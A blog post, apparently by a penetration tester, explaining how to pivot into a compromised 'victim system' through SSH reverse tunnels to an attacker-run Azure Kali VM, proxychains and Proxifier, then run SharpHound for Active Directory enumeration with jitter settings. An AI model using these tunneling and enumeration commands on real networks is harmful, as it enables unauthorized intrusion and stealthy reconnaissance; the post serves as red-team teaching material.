@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Proxying and tunneling, made simple - rt1252</title><meta name="Description" content="Help and instructions on how to tunnel and proxy"><meta property="og:url" content="http://localhost:1313/articles/tunneling/">
+  <meta property="og:site_name" content="rt1252">
+  <meta property="og:title" content="Proxying and tunneling, made simple">
+  <meta property="og:description" content="Help and instructions on how to tunnel and proxy">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="articles">
+    <meta property="article:published_time" content="2026-01-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-11T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Proxying and tunneling, made simple">
+  <meta name="twitter:description" content="Help and instructions on how to tunnel and proxy">
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/articles/tunneling/" /><link rel="prev" href="http://localhost:1313/articles/my-coolest-finds/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Proxying and tunneling, made simple",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/articles\/tunneling\/"
+        },"genre": "articles","wordcount":  466 ,
+        "url": "http:\/\/localhost:1313\/articles\/tunneling\/","datePublished": "2026-01-11T00:00:00+00:00","dateModified": "2026-01-11T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Raymond Truex. Views do not express my employer. Content is for educational purposes only."
+            },"description": "Help and instructions on how to tunnel and proxy"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="rt1252">rt1252</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/certs/"> Certs </a><a class="menu-item" href="/articles/"> Articles </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="rt1252">rt1252</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/certs/" title="">Certs</a><a class="menu-item" href="/articles/" title="">Articles</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Proxying and tunneling, made simple</h1><div class="content" id="content"><p>I hate networking; the setup and everything about it gives me a headache. Hopefully this article will help simplfy some of the easier tunneling setups.</p>
+<a class="lightgallery" href="/assets/proxy/frank.gif" title="/assets/proxy/frank.gif" data-thumbnail="/assets/proxy/frank.gif">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/proxy/frank.gif"
+            data-srcset="/assets/proxy/frank.gif, /assets/proxy/frank.gif 1.5x, /assets/proxy/frank.gif 2x"
+            data-sizes="auto"
+            alt="/assets/proxy/frank.gif" width="400" />
+    </a>
+<p>This article will show how to ensure that we have access to the tools that we want after gaining access to a victim system.</p>
+<p>This article will use four systems - the victim system (ssh &amp; internet enabled), an Azure Kali CLI VM with a publicly accessible IP, our personal Kali VM with a private IP, and our personal Windows VM with a private IP.</p>
+<h2 id="run-cli-tools-directly-from-azure-kali-cli-vm">Run CLI tools directly from Azure Kali CLI VM</h2>
+<p>From the victim system open a reverse port forward: <code>ssh -i key.pem -R 1080 -p &lt;port&gt;&gt; -N &lt;user&gt;&gt;@&lt;Azure IP&gt;&gt; -v</code></p>
+<p>Then simply connect to the Azure VM and run tools with proxychains.</p>
+<h2 id="run-tools-from-my-local-kali-vm">Run tools from my local Kali VM</h2>
+<p>Sometimes we want to run a tool that needs a GUI or we like our personal VM setup better.</p>
+<p>From the victim system run the same command to open a reverse port forward: <code>ssh &lt;user&gt;@&lt;Azure IP&gt; -p &lt;port&gt;&gt; -i key.pem -R 127.0.0.1:1080</code></p>
+<p>Then from your local VM open a local port forward: <code>ssh &lt;user&gt;@&lt;Azure IP&gt; -p &lt;port&gt; -i key.pem -L 127.0.0.1:1080:127.0.0.1:1080</code></p>
+<p>Then we can run tools same as we usually would using proxychains.</p>
+<h2 id="running-tools-from-my-local-windows-vm">Running tools from my local Windows VM</h2>
+<p>I have found that running SharpHound.exe instead of bloodhound-python is much faster and some Windows based tools are just better. In cases where we need to run Windows tools we will use Proxifier.</p>
+<p>Let&rsquo;s start with the same setup as in the previous example.</p>
+<p>From the victim system run the same command to open a reverse port forward: <code>ssh &lt;user&gt;@&lt;Azure IP&gt; -p &lt;port&gt;&gt; -i key.pem -R 127.0.0.1:9050</code></p>
+<p>Then from your local VM open a local port forward: <code>ssh &lt;user&gt;@&lt;Azure IP&gt; -p &lt;port&gt; -i key.pem -L 127.0.0.1:9050:127.0.0.1:9050</code></p>
+<p>Open Proxifier and setup a Proxy Server.
+<a class="lightgallery" href="/assets/proxy/server.png" title="/assets/proxy/server.png" data-thumbnail="/assets/proxy/server.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/proxy/server.png"
+            data-srcset="/assets/proxy/server.png, /assets/proxy/server.png 1.5x, /assets/proxy/server.png 2x"
+            data-sizes="auto"
+            alt="/assets/proxy/server.png" width="400" />
+    </a></p>
+<p>Add a Proxification rule that will send the traffic we want through the Proxy Server.
+<a class="lightgallery" href="/assets/proxy/rules.png" title="/assets/proxy/rules.png" data-thumbnail="/assets/proxy/rules.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/proxy/rules.png"
+            data-srcset="/assets/proxy/rules.png, /assets/proxy/rules.png 1.5x, /assets/proxy/rules.png 2x"
+            data-sizes="auto"
+            alt="/assets/proxy/rules.png" width="400" />
+    </a></p>
+<p>Edit the Proxification rule to our specifications, I like specifying *.FQDN and any IPs.</p>
+<a class="lightgallery" href="/assets/proxy/rule.png" title="/assets/proxy/rule.png" data-thumbnail="/assets/proxy/rule.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/proxy/rule.png"
+            data-srcset="/assets/proxy/rule.png, /assets/proxy/rule.png 1.5x, /assets/proxy/rule.png 2x"
+            data-sizes="auto"
+            alt="/assets/proxy/rule.png" width="400" />
+    </a>
+<p>Last we want to make sure that we resolve hostnames through the proxy.</p>
+<a class="lightgallery" href="/assets/proxy/dns.png" title="/assets/proxy/dns.png" data-thumbnail="/assets/proxy/dns.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/proxy/dns.png"
+            data-srcset="/assets/proxy/dns.png, /assets/proxy/dns.png 1.5x, /assets/proxy/dns.png 2x"
+            data-sizes="auto"
+            alt="/assets/proxy/dns.png" width="400" />
+    </a>
+<p>The next step is to open a cmd window and open a runas session through the proxy.</p>
+<p>From your cmd.exe window: <code>runas /netonly /user:ad1.prod\username powershell.exe</code>.</p>
+<p>Now we have a new runas window where we can finally run SharpHound.exe.</p>
+<p><code>.\SharpHound.exe -c DCOnly -d ad1.prod --ldapusername &quot;username&quot; --ldappassword &quot;password&quot; --domaincontroller &lt;DC IP&gt; --throttle 5000 --jitter 40 -v 4</code></p>
+<p>Quick note, if SharpHound.exe isn&rsquo;t working try another version, some versions have issues that will not work as they should.</p>
+<p>The best part of running tools through Proxifier is that you can see the amount of data sent and received, so long as the data sent/received is increasing you know the program is running through Proxifier correctly.</p>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                <a href="https://www.linkedin.com/in/ray-truex/" target="_blank" rel="noopener noreferrer" title="LinkedIn Profile">
+                    <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
+                </a>
+            </div><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.152.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;Raymond Truex. Views do not express my employer. Content is for educational purposes only.</span></div>
+        </div>
+    </footer><script>
+(function() {
+    function initMobileMenu() {
+        const menuToggle = document.getElementById('menu-toggle-mobile');
+        const menuMobile = document.getElementById('menu-mobile');
+        
+        if (!menuToggle || !menuMobile) {
+            return;
+        }
+        
+        
+        const newToggle = menuToggle.cloneNode(true);
+        menuToggle.parentNode.replaceChild(newToggle, menuToggle);
+        
+        
+        newToggle.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            document.body.classList.toggle('blur');
+            newToggle.classList.toggle('active');
+            menuMobile.classList.toggle('active');
+        }, false);
+    }
+    
+    
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', initMobileMenu);
+    } else {
+        
+        initMobileMenu();
+    }
+    
+    
+    setTimeout(initMobileMenu, 100);
+})();
+</script>
+</div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
